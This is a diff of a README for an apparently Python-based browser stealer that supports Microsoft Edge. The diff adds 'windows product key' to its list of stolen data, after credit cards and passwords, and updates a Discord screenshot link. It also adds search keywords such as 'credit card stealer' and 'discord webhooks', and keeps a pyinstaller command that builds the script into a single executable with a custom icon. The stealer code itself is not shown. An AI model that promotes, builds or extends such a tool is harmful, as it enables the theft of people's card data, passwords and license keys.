@@ -9,12 +9,12 @@
 
 >> supports microsoft edge
 
->> steals : credit cards, passwords
+>> steals : credit cards, passwords, windows product key
 
 ---------------------------------------------------
 # screenshot:
  
-![](https://cdn.discordapp.com/attachments/790276225947009034/790276232255766558/unknown.png)
+![](https://cdn.discordapp.com/attachments/790276225947009034/791350781872701440/example.png)
 
 
 # instructions:
@@ -38,4 +38,4 @@ pyinstaller --clean --onefile --icon=icon.ico pythonfile.py
 
 
 <>
-discord, passwords, browsersteal, credit cards, webhooks, python, chrome password stealer, browser password stealer, microsoft edge password stealer, credit card stealer, discord webhooks
+discord, passwords, browsersteal, credit cards, webhooks, python, chrome password stealer, browser password stealer, microsoft edge password stealer, credit card stealer, discord webhooks, windows key, windows product key, stealer
